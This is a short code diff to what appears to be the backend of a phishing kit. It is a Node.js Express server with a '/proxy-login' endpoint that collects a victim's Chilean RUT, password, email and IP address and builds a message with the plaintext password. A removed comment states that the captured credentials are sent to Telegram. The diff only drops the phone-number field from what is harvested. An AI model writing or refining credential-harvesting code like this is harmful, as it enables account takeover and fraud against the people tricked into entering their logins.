@@ -56,16 +56,15 @@ app.post("/autorizar", async (req, res) => {
   res.json({ status: "ok", mensaje: "Autorización recibida correctamente" });
 });
 
-// Endpoint para login → enviar credenciales, correo o teléfono a Telegram
 app.post("/proxy-login", async (req, res) => {
-  const { rut, passwd, mail, telefono } = req.body;
+  const { rut, passwd, mail } = req.body;
   const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
   let mensaje;
 
   if (mail) {
     mensaje = `Correo actualizado:\n${mail || "(sin correo)"}\nIP: ${ip}`;
   } else {
-    mensaje = `Login recibido AutOB:\nRUT: ${rut || "(sin rut)"}\nClave: ${passwd || "(sin clave)"}\nTeléfono: ${telefono || "(sin teléfono)"}\nIP: ${ip}`;
+    mensaje = `Login recibido AutOB:\nRUT: ${rut || "(sin rut)"}\nClave: ${passwd || "(sin clave)"}\nIP: ${ip}`;
   }
 
   try {
